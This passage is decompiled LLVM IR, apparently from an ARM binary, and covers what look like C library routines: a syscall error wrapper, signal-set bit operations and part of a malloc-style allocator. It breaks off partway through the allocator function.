define i32 @function_13940(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13940:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13940 = load i32, i32* @r7, align 4
  store i32 %v3_13940, i32* %stack_var_-8, align 4
  %v0_1394c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1394c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1394c, -4095
  br i1 %tmp, label %dec_label_pc_1396c, label %dec_label_pc_1395c

dec_label_pc_1395c:                               ; preds = %dec_label_pc_13940
  %v0_1395c = call i32 @function_13574()
  %v0_13960 = load i32, i32* %r7.global-to-local, align 4
  %v1_13960 = sub i32 0, %v0_13960
  store i32 %v1_13960, i32* @r3, align 4
  %v2_13964 = inttoptr i32 %v0_1395c to i32*
  store i32 %v1_13960, i32* %v2_13964, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1396c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1396c

dec_label_pc_1396c:                               ; preds = %dec_label_pc_13940, %dec_label_pc_1395c
  %v1_13970 = phi i32 [ %v0_1394c, %dec_label_pc_13940 ], [ -1, %dec_label_pc_1395c ]
  %v2_1396c = phi i32 [ %v3_13940, %dec_label_pc_13940 ], [ %v2_1396c.pre, %dec_label_pc_1395c ]
  store i32 %v2_1396c, i32* @r7, align 4
  ret i32 %v1_13970

; uselistorder directives
  uselistorder i32 %v0_1394c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1396c, { 1, 0 }
}

define i32 @function_13978(i32 %arg1) local_unnamed_addr {
dec_label_pc_13978:
  store i32 %arg1, i32* @r0, align 4
  %v3_13978 = load i32, i32* @r4, align 4
  %v0_13980 = call i32 @function_12d84()
  %v2_13988 = call i32 @function_12f18(i32 %v0_13980, i32 %arg1)
  store i32 %v3_13978, i32* @r4, align 4
  ret i32 %v2_13988

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_12f18, { 0, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_12d84, { 0, 1, 3, 2 }
}

define i32 @function_13994(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13994:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_139ac, label %dec_label_pc_139a4

dec_label_pc_139a4:                               ; preds = %dec_label_pc_13994
  %v7_139a8 = icmp slt i32 %arg1, 65
  br i1 %v7_139a8, label %dec_label_pc_139c0, label %dec_label_pc_139ac

dec_label_pc_139ac:                               ; preds = %dec_label_pc_139a4, %dec_label_pc_13994
  %v0_139ac = call i32 @function_13574()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_139b8 = inttoptr i32 %v0_139ac to i32*
  store i32 22, i32* %v2_139b8, align 4
  %v0_139c8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_139c8

dec_label_pc_139c0:                               ; preds = %dec_label_pc_139a4
  %v0_139c0 = call i32 @function_13ac8()
  store i32 %v0_139c0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_139c8

dec_label_pc_139c8:                               ; preds = %dec_label_pc_139ac, %dec_label_pc_139c0
  %v0_139c8 = phi i32 [ %v0_139c8.pre, %dec_label_pc_139ac ], [ %v0_139c0, %dec_label_pc_139c0 ]
  ret i32 %v0_139c8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_139c8, { 1, 0 }
}

define i32 @function_139d8(i32* %arg1) local_unnamed_addr {
dec_label_pc_139d8:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_139e0 = add i32 %tmp, 4
  %v3_139e0 = inttoptr i32 %v2_139e0 to i32*
  store i32 0, i32* %v3_139e0, align 4
  %v1_139e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_139e4 = inttoptr i32 %v1_139e4 to i32*
  store i32 0, i32* %v2_139e4, align 4
  ret i32 0
}

define i32 @function_139ec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_139ec:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_139ec = load i32, i32* @r4, align 4
  store i32 %v3_139ec, i32* %stack_var_-16, align 4
  %v6_139ec = load i32, i32* @r5, align 4
  %v9_139ec = load i32, i32* @r6, align 4
  %v7_139f4 = icmp eq i32 %arg2, -1
  br i1 %v7_139f4, label %.thread4, label %bb

.thread4:                                         ; preds = %dec_label_pc_139ec
  br label %.thread16

bb:                                               ; preds = %dec_label_pc_139ec
  %v2_139fc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_13a18

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_13a20

dec_label_pc_13a18:                               ; preds = %bb
  %v7_13a1c = icmp slt i32 %arg1, 65
  br i1 %v7_13a1c, label %dec_label_pc_13a34, label %dec_label_pc_13a20

dec_label_pc_13a20:                               ; preds = %.thread16, %dec_label_pc_13a18
  %v0_13a20 = call i32 @function_13574()
  store i32 22, i32* @r3, align 4
  store i32 -1, i32* @r2, align 4
  %v2_13a2c = inttoptr i32 %v0_13a20 to i32*
  store i32 22, i32* %v2_13a2c, align 4
  %v0_13a8c.pre = load i32, i32* @r2, align 4
  br label %bb33

dec_label_pc_13a34:                               ; preds = %dec_label_pc_13a18
  %v2_13a34 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13a34, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_13a3c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_13a3c, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_13a4c = call i32 @function_13ac8()
  %v0_13a54 = load i32, i32* @r5, align 4
  %v2_13a5c = call i32 @function_13aa4(i32 ptrtoint (i32* @global_var_23560.552 to i32), i32 %v0_13a54)
  %v0_13a74 = load i32, i32* @r5, align 4
  %v3_13a7c = call i32 @function_15ed8(i32 %v0_13a74, i32 %v2_13a34, i32 %v2_139fc)
  %v1_13a80 = icmp slt i32 %v3_13a7c, 0
  br i1 %v1_13a80, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_13a34
  %v5_13a84 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_13a84, i32* @r2, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_13a34
  store i32 -1, i32* @r2, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_13a20, %bb32
  %v0_13a8c = phi i32 [ %v5_13a84, %bb31 ], [ %v0_13a8c.pre, %dec_label_pc_13a20 ], [ -1, %bb32 ]
  %v2_13a94 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13a94, i32* @r4, align 4
  store i32 %v6_139ec, i32* @r5, align 4
  store i32 %v9_139ec, i32* @r6, align 4
  ret i32 %v0_13a8c

; uselistorder directives
  uselistorder i32 ()* @function_13ac8, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a20, { 1, 0 }
}

define i32 @function_13aa4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13aa4:
  %v1_13aa4 = add i32 %arg2, -1
  %v3_13aa8 = udiv i32 %v1_13aa4, 32
  %v4_13aac = mul nuw nsw i32 %v3_13aa8, 4
  %v5_13aac = add i32 %v4_13aac, %arg1
  %v6_13aac = inttoptr i32 %v5_13aac to i32*
  %v7_13aac = load i32, i32* %v6_13aac, align 4
  %v1_13ab0 = urem i32 %v1_13aa4, 32
  %v7_13ab8 = shl i32 1, %v1_13ab0
  %v8_13ab8 = and i32 %v7_13aac, %v7_13ab8
  %v10_13ab8 = icmp ne i32 %v8_13ab8, 0
  %. = zext i1 %v10_13ab8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_13aa4, { 1, 0 }
}

define i32 @function_13ac8() local_unnamed_addr {
dec_label_pc_13ac8:
  %v0_13ac8 = load i32, i32* @r1, align 4
  %v1_13ac8 = add i32 %v0_13ac8, -1
  %v3_13acc = udiv i32 %v1_13ac8, 32
  %v0_13ad0 = load i32, i32* @r0, align 4
  %v4_13ad0 = mul nuw nsw i32 %v3_13acc, 4
  %v5_13ad0 = add i32 %v0_13ad0, %v4_13ad0
  %v6_13ad0 = inttoptr i32 %v5_13ad0 to i32*
  %v7_13ad0 = load i32, i32* %v6_13ad0, align 4
  %v1_13ad4 = urem i32 %v1_13ac8, 32
  %v7_13adc = shl i32 1, %v1_13ad4
  %v8_13adc = or i32 %v7_13ad0, %v7_13adc
  store i32 %v8_13adc, i32* %v6_13ad0, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13ac8, { 1, 0 }
}

define i32 @function_13aec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13aec:
  %v1_13aec = add i32 %arg2, -1
  %v3_13af0 = udiv i32 %v1_13aec, 32
  %v4_13af4 = mul nuw nsw i32 %v3_13af0, 4
  %v5_13af4 = add i32 %v4_13af4, %arg1
  %v6_13af4 = inttoptr i32 %v5_13af4 to i32*
  %v7_13af4 = load i32, i32* %v6_13af4, align 4
  %v1_13af8 = urem i32 %v1_13aec, 32
  %tmp = shl i32 -1, %v1_13af8
  %v8_13b00 = add i32 %tmp, -1
  %v9_13b00 = and i32 %v7_13af4, %v8_13b00
  store i32 %v9_13b00, i32* %v6_13af4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13aec, { 1, 0 }
}

define i32 @function_13b10(i32 %arg1) local_unnamed_addr {
dec_label_pc_13b10:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_13b10 = udiv i32 %arg1, 256
  store i32 %v3_13b10, i32* %r1.global-to-local, align 4
  %v2_13b14 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_13b14, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_13b10
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_13b10, %bb
  %v0_13b20 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_13b14, i32 %v0_13b20)
  %v0_13b24 = load i32, i32* %r1.global-to-local, align 4
  %v1_13b24 = add i32 %v0_13b24, 1048320
  %v3_13b28 = udiv i32 %v1_13b24, 65536
  %v1_13b2c = and i32 %v3_13b28, 8
  %v6_13b30 = shl i32 %v0_13b24, %v1_13b2c
  %v1_13b34 = add i32 %v6_13b30, 520192
  %v3_13b38 = udiv i32 %v1_13b34, 65536
  %v1_13b3c = and i32 %v3_13b38, 4
  %v6_13b40 = shl i32 %v6_13b30, %v1_13b3c
  %v1_13b44 = add i32 %v6_13b40, 245760
  %v3_13b48 = udiv i32 %v1_13b44, 65536
  %v1_13b4c = and i32 %v3_13b48, 2
  %v6_13b50 = shl i32 %v6_13b40, %v1_13b4c
  store i32 %v6_13b50, i32* %r1.global-to-local, align 4
  %v1_13b54 = sub nsw i32 13, %v1_13b2c
  %v2_13b58 = sub nsw i32 %v1_13b54, %v1_13b3c
  %v3_13b5c = udiv i32 %v6_13b50, 32768
  %v4_13b5c = sub nuw nsw i32 -1, %v3_13b5c
  %v4_13b60 = udiv i32 %v6_13b50, 16384
  %v5_13b60 = and i32 %v4_13b60, %v4_13b5c
  %v2_13b64 = sub nsw i32 %v2_13b58, %v1_13b4c
  %v2_13b68 = add nsw i32 %v2_13b64, %v5_13b60
  %v1_13b6c = add nsw i32 %v2_13b68, 6
  %v0_13b70 = load i32, i32* %ip.global-to-local, align 4
  %v6_13b70 = lshr i32 %v0_13b70, %v1_13b6c
  %v3_13b74 = mul nsw i32 %v2_13b68, 4
  %v1_13b78 = add nsw i32 %v3_13b74, 32
  %v1_13b7c = urem i32 %v6_13b70, 4
  %v2_13b80 = or i32 %v1_13b7c, %v1_13b78
  ret i32 %v2_13b80

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_13b88() local_unnamed_addr {
dec_label_pc_13b88:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_13b88 = load i32, i32* @r4, align 4
  %v6_13b88 = load i32, i32* @r5, align 4
  %v9_13b88 = load i32, i32* @r6, align 4
  %v12_13b88 = load i32, i32* @r7, align 4
  %v15_13b88 = load i32, i32* @r8, align 4
  %v18_13b88 = load i32, i32* @sb, align 4
  %v21_13b88 = load i32, i32* @sl, align 4
  %v24_13b88 = load i32, i32* @fp, align 4
  %v27_13b88 = load i32, i32* @lr, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r1.global-to-local, align 4
  %v4_13b9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80864) to i32*), align 4
  store i32 %v4_13b9c, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_13ba8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80832) to i32*), align 4
  store i32 %v4_13ba8, i32* %r1.global-to-local, align 4
  %v0_13bac = load i32, i32* @r0, align 4
  store i32 %v0_13bac, i32* @r5, align 4
  store i32 %v4_13b9c, i32* %r2.global-to-local, align 4
  %v2_13bb4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13bb4, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %ip.global-to-local, align 4
  %v4_13bc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80868) to i32*), align 4
  store i32 %v4_13bc0, i32* %ip.global-to-local, align 4
  store i32 80844, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13bc0)
  %v0_13bcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13bcc, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r1.global-to-local, align 4
  %v4_13bd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80812) to i32*), align 4
  store i32 %v4_13bd8, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_13be4.559 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13bd8)
  %v0_13be4 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_13be4, -32
  br i1 %tmp, label %dec_label_pc_13c00, label %dec_label_pc_13bec

dec_label_pc_13bec:                               ; preds = %dec_label_pc_13b88
  %v0_13bec = call i32 @function_13574()
  store i32 %v0_13bec, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_13bf8 = inttoptr i32 %v0_13bec to i32*
  store i32 12, i32* %v2_13bf8, align 4
  br label %dec_label_pc_1447c

dec_label_pc_13c00:                               ; preds = %dec_label_pc_13b88
  %v1_13c00 = add i32 %v0_13be4, 11
  store i32 %v1_13c00, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r2.global-to-local, align 4
  %v2_13c0c = icmp ugt i32 %v1_13c00, 14
  %v7_13c0c = icmp eq i32 %v1_13c00, 15
  %v2_13c10 = xor i1 %v7_13c0c, true
  %v3_13c10 = and i1 %v2_13c0c, %v2_13c10
  br i1 %v3_13c10, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_13c00
  %v5_13c10 = and i32 %v1_13c00, -8
  store i32 %v5_13c10, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_13c00, %bb
  %v4_13c14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_13c14, i32* @r0, align 4
  %v1_13c18 = inttoptr i32 %v4_13c14 to i32*
  %v2_13c18 = load i32, i32* %v1_13c18, align 4
  store i32 %v2_13c18, i32* @r4, align 4
  %v2_13c1c = xor i1 %v2_13c0c, true
  %v3_13c1c = or i1 %v7_13c0c, %v2_13c1c
  br i1 %v3_13c1c, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_13c20 = urem i32 %v2_13c18, 2
  %v2_13c20 = icmp eq i32 %v1_13c20, 0
  br i1 %v2_13c20, label %dec_label_pc_13c28, label %dec_label_pc_13c38

dec_label_pc_13c28:                               ; preds = %bb140
  %v2_13c28 = icmp eq i32 %v2_13c18, 0
  br i1 %v2_13c28, label %dec_label_pc_13c30, label %dec_label_pc_14014

dec_label_pc_13c30:                               ; preds = %dec_label_pc_13c28
  %v0_13c30 = call i32 @function_14a40()
  store i32 %v0_13c30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14014

dec_label_pc_13c38:                               ; preds = %bb140
  %v0_13c38 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_13c38, %v2_13c18
  br i1 %tmp201, label %dec_label_pc_13c60, label %dec_label_pc_13c40

dec_label_pc_13c40:                               ; preds = %dec_label_pc_13c38
  %v1_13c40 = add i32 %v4_13c14, -4
  store i32 %v1_13c40, i32* %r1.global-to-local, align 4
  %v3_13c44 = udiv i32 %v0_13c38, 8
  store i32 %v3_13c44, i32* %r2.global-to-local, align 4
  %v4_13c48 = mul nuw i32 %v3_13c44, 4
  %v5_13c48 = add i32 %v4_13c48, %v1_13c40
  %v6_13c48 = inttoptr i32 %v5_13c48 to i32*
  %v7_13c48 = load i32, i32* %v6_13c48, align 4
  store i32 %v7_13c48, i32* %r0.global-to-local, align 4
  %v2_13c4c = icmp eq i32 %v7_13c48, 0
  br i1 %v2_13c4c, label %dec_label_pc_13c60, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13c40
  %v2_13c50 = add i32 %v7_13c48, 8
  %v3_13c50 = inttoptr i32 %v2_13c50 to i32*
  %v4_13c50 = load i32, i32* %v3_13c50, align 4
  store i32 %v4_13c50, i32* %r3.global-to-local, align 4
  store i32 %v2_13c50, i32* %r0.global-to-local, align 4
  store i32 %v2_13c50, i32* %r4.global-to-local, align 4
  store i32 %v4_13c50, i32* %v6_13c48, align 4
  br label %dec_label_pc_14460

dec_label_pc_13c60:                               ; preds = %dec_label_pc_13c40, %dec_label_pc_13c38
  %tmp202 = icmp ugt i32 %v0_13c38, 255
  br i1 %tmp202, label %dec_label_pc_13cb0, label %dec_label_pc_13c68

dec_label_pc_13c68:                               ; preds = %dec_label_pc_13c60
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_13c70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  %v3_13c74 = udiv i32 %v0_13c38, 8
  store i32 %v3_13c74, i32* @r7, align 4
  %v4_13c78 = mul nuw i32 %v3_13c74, 8
  %v5_13c78 = add i32 %v4_13c70, %v4_13c78
  store i32 %v5_13c78, i32* %r3.global-to-local, align 4
  %v1_13c7c = add i32 %v5_13c78, 44
  store i32 %v1_13c7c, i32* %ip.global-to-local, align 4
  %v1_13c80 = add i32 %v5_13c78, 56
  %v2_13c80 = inttoptr i32 %v1_13c80 to i32*
  %v3_13c80 = load i32, i32* %v2_13c80, align 4
  store i32 %v3_13c80, i32* %r0.global-to-local, align 4
  %v9_13c84 = icmp eq i32 %v3_13c80, %v1_13c7c
  br i1 %v9_13c84, label %dec_label_pc_13e10, label %dec_label_pc_13c8c

dec_label_pc_13c8c:                               ; preds = %dec_label_pc_13c68
  %v2_13c8c = add i32 %v3_13c80, %v0_13c38
  store i32 %v2_13c8c, i32* %r3.global-to-local, align 4
  %v1_13c90 = add i32 %v2_13c8c, 4
  %v2_13c90 = inttoptr i32 %v1_13c90 to i32*
  %v3_13c90 = load i32, i32* %v2_13c90, align 4
  store i32 %v3_13c90, i32* %r2.global-to-local, align 4
  %v1_13c94 = add i32 %v3_13c80, 12
  %v2_13c94 = inttoptr i32 %v1_13c94 to i32*
  %v3_13c94 = load i32, i32* %v2_13c94, align 4
  store i32 %v3_13c94, i32* %r1.global-to-local, align 4
  %v1_13c98 = or i32 %v3_13c90, 1
  store i32 %v1_13c98, i32* %r2.global-to-local, align 4
  %v1_13c9c = add i32 %v3_13c80, 8
  store i32 %v1_13c9c, i32* %r4.global-to-local, align 4
  store i32 %v1_13c98, i32* %v2_13c90, align 4
  %v0_13ca4 = load i32, i32* %ip.global-to-local, align 4
  %v1_13ca4 = load i32, i32* %r1.global-to-local, align 4
  %v2_13ca4 = add i32 %v1_13ca4, 8
  %v3_13ca4 = inttoptr i32 %v2_13ca4 to i32*
  store i32 %v0_13ca4, i32* %v3_13ca4, align 4
  %v0_13ca8 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ca8 = load i32, i32* %ip.global-to-local, align 4
  %v2_13ca8 = add i32 %v1_13ca8, 12
  %v3_13ca8 = inttoptr i32 %v2_13ca8 to i32*
  store i32 %v0_13ca8, i32* %v3_13ca8, align 4
  br label %dec_label_pc_14460

dec_label_pc_13cb0:                               ; preds = %dec_label_pc_13c60
  store i32 %v0_13c38, i32* %r0.global-to-local, align 4
  %v1_13cb4 = call i32 @function_13b10(i32 %v0_13c38)
  store i32 %v1_13cb4, i32* %r0.global-to-local, align 4
  %v0_13cb8 = load i32, i32* @r4, align 4
  %v1_13cb8 = and i32 %v0_13cb8, 2
  %v2_13cb8 = icmp eq i32 %v1_13cb8, 0
  store i32 %v1_13cb4, i32* @r7, align 4
  br i1 %v2_13cb8, label %dec_label_pc_13e10, label %dec_label_pc_13cc4

dec_label_pc_13cc4:                               ; preds = %dec_label_pc_13cb0
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r1.global-to-local, align 4
  %v4_13ccc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_13ccc, i32* @r0, align 4
  %v0_13cd0 = call i32 @function_14a40()
  store i32 %v0_13cd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13e10

dec_label_pc_13cd8:                               ; preds = %dec_label_pc_13e24
  %v1_13cd8 = add i32 %v3_13e24, 4
  %v2_13cd8 = inttoptr i32 %v1_13cd8 to i32*
  %v3_13cd8 = load i32, i32* %v2_13cd8, align 4
  store i32 %v3_13cd8, i32* %r3.global-to-local, align 4
  %v0_13cdc = load i32, i32* @sl, align 4
  %v1_13ce0 = and i32 %v3_13cd8, -4
  store i32 %v1_13ce0, i32* %r4.global-to-local, align 4
  %v1_13ce4 = add i32 %v3_13e24, 12
  %v2_13ce4 = inttoptr i32 %v1_13ce4 to i32*
  %v3_13ce4 = load i32, i32* %v2_13ce4, align 4
  store i32 %v3_13ce4, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_13cdc, 255
  br i1 %tmp203, label %dec_label_pc_13d40, label %dec_label_pc_13cec

dec_label_pc_13cec:                               ; preds = %dec_label_pc_13cd8
  %v9_13cec = icmp eq i32 %v3_13ce4, %v0_13d44
  br i1 %v9_13cec, label %dec_label_pc_13cf4, label %dec_label_pc_13d40

dec_label_pc_13cf4:                               ; preds = %dec_label_pc_13cec
  %v0_13cf4 = load i32, i32* @sb, align 4
  %v1_13cf4 = add i32 %v0_13cf4, 48
  %v2_13cf4 = inttoptr i32 %v1_13cf4 to i32*
  %v3_13cf4 = load i32, i32* %v2_13cf4, align 4
  store i32 %v3_13cf4, i32* %r3.global-to-local, align 4
  %v9_13cf8 = icmp eq i32 %v3_13e24, %v3_13cf4
  br i1 %v9_13cf8, label %dec_label_pc_13d00, label %dec_label_pc_13d40

dec_label_pc_13d00:                               ; preds = %dec_label_pc_13cf4
  %v1_13d00 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_13ce0, %v1_13d00
  br i1 %tmp204, label %dec_label_pc_13d08, label %dec_label_pc_13d40

dec_label_pc_13d08:                               ; preds = %dec_label_pc_13d00
  %v2_13d08 = sub i32 %v1_13ce0, %v0_13cdc
  store i32 %v2_13d08, i32* %r2.global-to-local, align 4
  %v2_13d0c = add i32 %v0_13cdc, %v3_13e24
  store i32 %v2_13d0c, i32* %r3.global-to-local, align 4
  %v1_13d10 = or i32 %v0_13cdc, 1
  store i32 %v1_13d10, i32* %r0.global-to-local, align 4
  %v1_13d14 = or i32 %v2_13d08, 1
  store i32 %v1_13d14, i32* %r1.global-to-local, align 4
  %v1_13d18 = add i32 %v3_13e24, 8
  store i32 %v1_13d18, i32* %r4.global-to-local, align 4
  %v2_13d1c = add i32 %v0_13d44, 8
  %v3_13d1c = inttoptr i32 %v2_13d1c to i32*
  store i32 %v2_13d0c, i32* %v3_13d1c, align 4
  %v0_13d20 = load i32, i32* %r3.global-to-local, align 4
  %v1_13d20 = load i32, i32* %ip.global-to-local, align 4
  %v2_13d20 = add i32 %v1_13d20, 12
  %v3_13d20 = inttoptr i32 %v2_13d20 to i32*
  store i32 %v0_13d20, i32* %v3_13d20, align 4
  %v0_13d24 = load i32, i32* %r0.global-to-local, align 4
  %v1_13d24 = load i32, i32* @r6, align 4
  %v2_13d24 = add i32 %v1_13d24, 4
  %v3_13d24 = inttoptr i32 %v2_13d24 to i32*
  store i32 %v0_13d24, i32* %v3_13d24, align 4
  %v0_13d28 = load i32, i32* %r3.global-to-local, align 4
  %v1_13d28 = load i32, i32* @sb, align 4
  %v2_13d28 = add i32 %v1_13d28, 48
  %v3_13d28 = inttoptr i32 %v2_13d28 to i32*
  store i32 %v0_13d28, i32* %v3_13d28, align 4
  %v0_13d2c = load i32, i32* %r2.global-to-local, align 4
  %v1_13d2c = load i32, i32* %r3.global-to-local, align 4
  %v3_13d2c = add i32 %v1_13d2c, %v0_13d2c
  %v4_13d2c = inttoptr i32 %v3_13d2c to i32*
  store i32 %v0_13d2c, i32* %v4_13d2c, align 4
  %v0_13d30 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d30 = load i32, i32* %r3.global-to-local, align 4
  %v2_13d30 = add i32 %v1_13d30, 4
  %v3_13d30 = inttoptr i32 %v2_13d30 to i32*
  store i32 %v0_13d30, i32* %v3_13d30, align 4
  %v0_13d34 = load i32, i32* %ip.global-to-local, align 4
  %v1_13d34 = load i32, i32* %r3.global-to-local, align 4
  %v2_13d34 = add i32 %v1_13d34, 12
  %v3_13d34 = inttoptr i32 %v2_13d34 to i32*
  store i32 %v0_13d34, i32* %v3_13d34, align 4
  %v0_13d38 = load i32, i32* %ip.global-to-local, align 4
  %v1_13d38 = load i32, i32* %r3.global-to-local, align 4
  %v2_13d38 = add i32 %v1_13d38, 8
  %v3_13d38 = inttoptr i32 %v2_13d38 to i32*
  store i32 %v0_13d38, i32* %v3_13d38, align 4
  br label %dec_label_pc_14460

dec_label_pc_13d40:                               ; preds = %dec_label_pc_13d00, %dec_label_pc_13cf4, %dec_label_pc_13cec, %dec_label_pc_13cd8
  %v9_13d40 = icmp eq i32 %v1_13ce0, %v0_13cdc
  %v2_13d44 = add i32 %v3_13ce4, 8
  %v3_13d44 = inttoptr i32 %v2_13d44 to i32*
  store i32 %v0_13d44, i32* %v3_13d44, align 4
  %v0_13d48 = load i32, i32* %ip.global-to-local, align 4
  %v1_13d48 = load i32, i32* %r5.global-to-local, align 4
  %v2_13d48 = add i32 %v1_13d48, 12
  %v3_13d48 = inttoptr i32 %v2_13d48 to i32*
  store i32 %v0_13d48, i32* %v3_13d48, align 4
  br i1 %v9_13d40, label %dec_label_pc_13ea0.loopexit, label %dec_label_pc_13d5c

dec_label_pc_13d5c:                               ; preds = %dec_label_pc_13d40
  %v0_13d5c = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_13d5c, 255
  br i1 %tmp205, label %dec_label_pc_13d80, label %dec_label_pc_13d64

dec_label_pc_13d64:                               ; preds = %dec_label_pc_13d5c
